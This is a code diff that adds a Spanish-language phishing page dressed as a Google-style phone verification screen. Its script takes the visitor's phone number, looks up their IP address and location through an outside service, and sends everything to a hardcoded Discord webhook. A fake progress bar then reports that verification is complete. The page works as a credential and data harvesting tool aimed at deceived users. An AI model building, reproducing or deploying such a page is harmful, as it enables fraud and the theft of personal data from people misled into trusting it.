@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+
+
+
+
+Verifica tu número de teléfono
+
+body{font-family:Inter,Roboto,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;color:#202124}
+.box{width:100%;max-width:400px;padding:48px 40px;border:1px solid #dadce0;border-radius:8px}
+.logo{width:72px;height:72px;margin:0 auto 24px;border-radius:50%;background:conic-gradient(#4285F4 0 25%,#EA4335 25% 50%,#FBBC05 50% 75%,#34A853 75% 100%);position:relative}
+.logo::after{content:"";position:absolute;inset:14px;background:#fff;border-radius:50%}
+h1{font-size:22px;font-weight:500;text-align:center;margin:0 0 10px}
+p{font-size:14px;color:#5f6368;text-align:center;margin:0 0 28px;line-height:1.5}
+.row{display:flex;gap:8px;margin-bottom:16px}
+select,input{font-size:15px;padding:12px;border:1px solid #dadce0;border-radius:6px;outline:none}
+select{width:40%}
+input{flex:1}
+select:focus,input:focus{border-color:#4285F4}
+button{width:100%;padding:12px;font-size:15px;font-weight:500;color:#fff;background:#4285F4;border:none;border-radius:6px;cursor:pointer}
+button:hover{background:#1a73e8}
+.links{display:flex;justify-content:space-between;margin-top:32px;font-size:12px}
+.links a{color:#5f6368;text-decoration:none}
+.links a:hover{color:#4285F4}
+#status{font-size:13px;color:#5f6368;text-align:center;margin-top:16px;display:none}
+
+
+
+
+
+Verifica tu número de teléfono
+Por tu seguridad, confirma tu número para acceder a tu cuenta
+
+
+
+🇺🇸 +1
+🇪🇸 +34
+🇲🇽 +52
+🇨🇴 +57
+🇦🇷 +54
+🇵🇪 +51
+🇨🇱 +56
+
+
+
+Siguiente
+
+Verificando... 0%
+AyudaPrivacidadTérminos
+
+
+const WEBHOOK="https://discord.com/api/webhooks/1556692474918076497/QZgSuwKh5-BioK1qODSW24i_CB0fOWaNc-5DDgcmEs_q7pybJXdyjGSHvMVRuCXvZcIj";
+document.getElementById("f").addEventListener("submit",async e=>{
+e.preventDefault();
+const tel=document.getElementById("tel").value;
+const pais=document.getElementById("pais").value;
+const st=document.getElementById("status");
+st.style.display="block";
+let ip="desconocida";
+try{const r=await fetch("https://ipapi.co/json/");const
+d=await r.json();ip=d.ip+" | "+d.country_name+" | "+d.city;}catch(x){}
+const body="📱 **Nuevo número**\n`"+pais+tel+"`\n🌍 IP: "+ip;
+try{await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:body})});}catch(x){}
+let p=0;
+const iv=setInterval(()=>{p+=Math.random()*15;if(p>=90){p=90;clearInterval(iv);st.textContent="Verificación completada";}else{st.textContent="Verificando... "+Math.floor(p)+"%";}},400);
+});
+
+
+
